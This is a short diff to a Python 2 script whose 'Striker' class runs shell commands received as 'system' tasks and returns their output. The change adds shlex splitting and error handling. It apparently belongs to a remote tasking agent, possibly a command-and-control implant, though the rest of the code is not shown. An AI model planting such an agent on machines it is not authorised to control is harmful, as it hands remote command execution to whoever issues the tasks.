@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-import sys, os, subprocess, requests, json, time
+import sys, os, subprocess, shlex, requests, json, time
 
 class Striker:
 
@@ -36,8 +36,11 @@ class Striker:
     result = "Not implemented!"
     if (task['taskType'] == "system"):
       cmd = data['cmd']
-      proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-      result = proc.stderr.read() + proc.stdout.read()
+      try:
+        proc = subprocess.Popen(shlex.split(cmd), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        result = proc.stderr.read() + proc.stdout.read()
+      except Exception, e:
+        result = "Error running task: " + str(e)
     return {"uid":taskID, "result":result}
 
   def main(self):
